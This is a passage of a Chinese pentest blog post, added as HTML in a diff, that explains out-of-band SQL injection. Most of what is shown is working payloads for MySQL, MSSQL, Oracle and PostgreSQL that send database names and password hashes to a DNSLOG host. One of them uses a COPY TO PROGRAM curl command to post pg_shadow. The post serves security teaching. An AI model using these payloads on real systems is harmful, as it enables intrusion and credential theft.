@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言传统SQL注入依赖页面回显（Union）或盲注逐字符猜解。当目标屏蔽回显且网络允许时，Out-of-Band（OOB）外带注入将数据通过DNS&#x2F;HTTP&#x2F;SMB带外信道传出，绕开前端，把盲注升级为”半显式”攻击。本文梳理各数据库OOB技法、DNSLOG原理、SQLMap实战与防御。  核心思想传统注入数据走HTTP响应；OOB由数据库主动发起外连（DNS查询、UNC路径、H">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入：OOB外带注入">
+<meta property="og:url" content="https://congliang.github.io/SQL-injection-out-of-band/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言传统SQL注入依赖页面回显（Union）或盲注逐字符猜解。当目标屏蔽回显且网络允许时，Out-of-Band（OOB）外带注入将数据通过DNS&#x2F;HTTP&#x2F;SMB带外信道传出，绕开前端，把盲注升级为”半显式”攻击。本文梳理各数据库OOB技法、DNSLOG原理、SQLMap实战与防御。  核心思想传统注入数据走HTTP响应；OOB由数据库主动发起外连（DNS查询、UNC路径、H">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.960Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/SQL-injection-out-of-band/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/SQL-injection-out-of-band/","path":"SQL-injection-out-of-band/","title":"SQL注入：OOB外带注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入：OOB外带注入 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span class="nav-number">2.</span> <span class="nav-text">核心思想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNSLOG%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">DNSLOG原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E6%95%B0%E6%8D%AE%E5%BA%93OOB%E6%8A%80%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">各数据库OOB技法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81MySQL"><span class="nav-number">4.1.</span> <span class="nav-text">一、MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81MSSQL"><span class="nav-number">4.2.</span> <span class="nav-text">二、MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81Oracle"><span class="nav-number">4.3.</span> <span class="nav-text">三、Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81PostgreSQL"><span class="nav-number">4.4.</span> <span class="nav-text">四、PostgreSQL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E9%9A%A7%E9%81%93%E5%B1%80%E9%99%90%EF%BC%9A63%E5%AD%97%E7%AC%A6%E6%A0%87%E7%AD%BE%E9%99%90%E5%88%B6"><span class="nav-number">5.</span> <span class="nav-text">DNS隧道局限：63字符标签限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5"><span class="nav-number">5.1.</span> <span class="nav-text">应对策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMap%E5%AE%9E%E6%88%98%EF%BC%9A-dns-domain"><span class="nav-number">6.</span> <span class="nav-text">SQLMap实战：--dns-domain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">6.1.</span> <span class="nav-text">工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E6%80%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">6.2.</span> <span class="nav-text">实战总流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%9D%91%E7%82%B9"><span class="nav-number">7.</span> <span class="nav-text">常见坑点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">8.</span> <span class="nav-text">防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E4%BE%A7"><span class="nav-number">8.1.</span> <span class="nav-text">开发侧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E7%BB%B4%E4%BE%A7"><span class="nav-number">8.2.</span> <span class="nav-text">运维侧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94"><span class="nav-number">9.</span> <span class="nav-text">技术对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">10.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-out-of-band/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入：OOB外带注入 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入：OOB外带注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-01T08:00:00+08:00">2025-01-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>传统SQL注入依赖页面回显（Union）或盲注逐字符猜解。当目标屏蔽回显且网络允许时，<strong>Out-of-Band（OOB）外带注入</strong>将数据通过DNS&#x2F;HTTP&#x2F;SMB带外信道传出，绕开前端，把盲注升级为”半显式”攻击。本文梳理各数据库OOB技法、DNSLOG原理、SQLMap实战与防御。</p>
+<hr>
+<h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>传统注入数据走HTTP响应；OOB由数据库主动发起外连（DNS查询、UNC路径、HTTP请求），将数据编码在协议载荷中：</p>
+<pre class="mermaid">flowchart LR
+    subgraph 传统注入
+        A1[Payload] --> A2[DB] --> A3[HTTP响应] --> A4[攻击者]
+    end
+    subgraph OOB注入
+        B1[Payload] --> B2[DB]
+        B2 -- DNS/HTTP/SMB --> B3[DNSLOG平台] --> B4[攻击者]
+    end</pre>
+
+<hr>
+<h2 id="DNSLOG原理"><a href="#DNSLOG原理" class="headerlink" title="DNSLOG原理"></a>DNSLOG原理</h2><p>DNS是首选OOB信道：UDP 53极少被拦截、查询可携带任意子域名、递归解析保证到达攻击者NS。流程：注册DNSLOG平台 → Payload拼接 <code>&lt;data&gt;.attacker.com</code> → 数据库触发 <code>gethostbyname</code> → DNSLOG记录 → 攻击者轮询API解码。</p>
+<pre class="mermaid">flowchart TD
+    A[SQL Payload] --> B[DB拼接域名] --> C[OS DNS解析]
+    C --> D[DNSLOG权威NS] --> E[攻击者轮询API]</pre>
+
+<table>
+<thead>
+<tr>
+<th>平台</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ceye.io</td>
+<td>注册即送二级域名，支持DNS&#x2F;HTTP&#x2F;TCP</td>
+</tr>
+<tr>
+<td>Burp Collaborator</td>
+<td>Burp内置，全协议，HTTPS上下文复用</td>
+</tr>
+<tr>
+<td>Interactsh</td>
+<td>开源，自托管，API友好</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="各数据库OOB技法"><a href="#各数据库OOB技法" class="headerlink" title="各数据库OOB技法"></a>各数据库OOB技法</h2><h3 id="一、MySQL"><a href="#一、MySQL" class="headerlink" title="一、MySQL"></a>一、MySQL</h3><p>LOAD_FILE + UNC路径（Windows）利用UNC解析自动触发DNS与SMB：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 验证注入点</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>, DATABASE(), <span class="string">&#x27;.your-id.ceye.io\\abc&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 拖表名（GROUP_CONCAT拼接多行）</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,</span><br><span class="line">  (<span class="keyword">SELECT</span> GROUP_CONCAT(table_name SEPARATOR <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">   <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE()),</span><br><span class="line">  <span class="string">&#x27;.your-id.ceye.io\\abc&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 拖字段（hex编码避免特殊字符破坏域名）</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,</span><br><span class="line">  HEX((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>)), <span class="string">&#x27;.your-id.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>前提</strong>：MySQL on Windows；<code>secure_file_priv</code> 为空或宽松；<code>FILE</code> 权限。受限时尝试UDF外带。</p>
+<hr>
+<h3 id="二、MSSQL"><a href="#二、MSSQL" class="headerlink" title="二、MSSQL"></a>二、MSSQL</h3><p>MSSQL得益于大量扩展存储过程，OOB手段最丰富。</p>
+<p><strong>xp_dirtree</strong> —— 接受UNC路径自动触发SMB&#x2F;DNS：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@h</span> <span class="type">VARCHAR</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@h</span> <span class="operator">=</span> <span class="built_in">SUBSTRING</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">40</span>) <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master..xp_dirtree <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="variable">@h</span> <span class="operator">+</span> <span class="string">&#x27;\foo&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 游标逐行枚举</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@d</span> <span class="type">VARCHAR</span>(<span class="number">100</span>), <span class="variable">@c</span> <span class="type">VARCHAR</span>(<span class="number">200</span>);</span><br><span class="line"><span class="keyword">DECLARE</span> cur <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sys.databases;</span><br><span class="line"><span class="keyword">OPEN</span> cur; <span class="keyword">FETCH</span> NEXT <span class="keyword">FROM</span> cur <span class="keyword">INTO</span> <span class="variable">@d</span>;</span><br><span class="line">WHILE @<span class="variable">@FETCH_STATUS</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SET</span> <span class="variable">@c</span> <span class="operator">=</span> <span class="string">&#x27;master..xp_dirtree &#x27;&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="variable">@d</span> <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">EXEC</span>(<span class="variable">@c</span>); <span class="keyword">FETCH</span> NEXT <span class="keyword">FROM</span> cur <span class="keyword">INTO</span> <span class="variable">@d</span>;</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">CLOSE</span> cur; <span class="keyword">DEALLOCATE</span> cur;</span><br></pre></td></tr></table></figure>
+
+<p><strong>xp_fileexist &#x2F; xp_subdirs</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master..xp_fileexist <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span> DB_NAME() <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master..xp_subdirs <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="built_in">SYSTEM_USER</span> <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>OLE自动化对象（HTTP外带）与 sp_makewebtask</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- OLE HTTP</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@o</span> <span class="type">INT</span>, <span class="variable">@u</span> <span class="type">VARCHAR</span>(<span class="number">200</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@u</span> <span class="operator">=</span> <span class="string">&#x27;http://your-id.ceye.io/&#x27;</span> <span class="operator">+</span> DB_NAME();</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;MSXML2.ServerXMLHTTP&#x27;</span>, <span class="variable">@o</span> <span class="keyword">OUT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@o</span>, <span class="string">&#x27;open&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="variable">@u</span>, <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@o</span>, <span class="string">&#x27;send&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sp_makewebtask（旧版本可用）</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_makewebtask <span class="variable">@outputfile</span><span class="operator">=</span><span class="string">&#x27;\\your-id.ceye.io\share\out.html&#x27;</span>,</span><br><span class="line">  <span class="variable">@query</span><span class="operator">=</span><span class="string">&#x27;SELECT * FROM users&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="三、Oracle"><a href="#三、Oracle" class="headerlink" title="三、Oracle"></a>三、Oracle</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- UTL_HTTP（HTTP外带）</span></span><br><span class="line"><span class="keyword">DECLARE</span> req UTL_HTTP.REQ; resp UTL_HTTP.RESP; url VARCHAR2(<span class="number">2000</span>);</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span> <span class="string">&#x27;http://your-id.ceye.io/&#x27;</span> <span class="operator">||</span></span><br><span class="line">    (<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="keyword">INTO</span> url <span class="keyword">FROM</span> dual;</span><br><span class="line">  req :<span class="operator">=</span> UTL_HTTP.BEGIN_REQUEST(url);</span><br><span class="line">  resp :<span class="operator">=</span> UTL_HTTP.GET_RESPONSE(req);</span><br><span class="line">  UTL_HTTP.END_RESPONSE(resp);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- UTL_INADDR（DNS解析外带）</span></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(</span><br><span class="line">  (<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="operator">||</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span></span><br><span class="line">) <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- HTTPURITYPE（最简洁HTTP外带）</span></span><br><span class="line"><span class="keyword">SELECT</span> HTTPURITYPE(</span><br><span class="line">  <span class="string">&#x27;http://your-id.ceye.io/&#x27;</span> <span class="operator">||</span> (<span class="keyword">SELECT</span> name <span class="keyword">FROM</span> v$database)</span><br><span class="line">).GETCLOB() <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- DBMS_LDAP</span></span><br><span class="line"><span class="keyword">DECLARE</span> s DBMS_LDAP.SESSION;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  s :<span class="operator">=</span> DBMS_LDAP.INIT(</span><br><span class="line">    (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> sys.user$ <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>) <span class="operator">||</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span>, <span class="number">389</span></span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="四、PostgreSQL"><a href="#四、PostgreSQL" class="headerlink" title="四、PostgreSQL"></a>四、PostgreSQL</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- COPY TO PROGRAM（需superuser）</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> pg_shadow)</span><br><span class="line"><span class="keyword">TO</span> PROGRAM <span class="string">&#x27;curl --data-binary @- http://your-id.ceye.io/data&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- dblink扩展</span></span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION dblink;</span><br><span class="line"><span class="keyword">SELECT</span> dblink_connect(</span><br><span class="line">  <span class="string">&#x27;host=&#x27;</span><span class="operator">||</span>current_database()<span class="operator">||</span><span class="string">&#x27;.your-id.ceye.io port=5432 dbname=postgres&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- plpythonu自定义函数</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> dns_exfil(data TEXT) <span class="keyword">RETURNS</span> VOID <span class="keyword">AS</span> $$</span><br><span class="line">  import socket; socket.gethostbyname(data <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io&#x27;</span>)</span><br><span class="line">$$ <span class="keyword">LANGUAGE</span> plpythonu;</span><br><span class="line"><span class="keyword">SELECT</span> dns_exfil((<span class="keyword">SELECT</span> passwd <span class="keyword">FROM</span> pg_shadow LIMIT <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="DNS隧道局限：63字符标签限制"><a href="#DNS隧道局限：63字符标签限制" class="headerlink" title="DNS隧道局限：63字符标签限制"></a>DNS隧道局限：63字符标签限制</h2><p>RFC 1035规定DNS标签不超过63字节，单次查询最多携带63有效字符。</p>
+<h3 id="应对策略"><a href="#应对策略" class="headerlink" title="应对策略"></a>应对策略</h3><p><strong>SUBSTRING分片</strong>（每轮63字符）：</p>
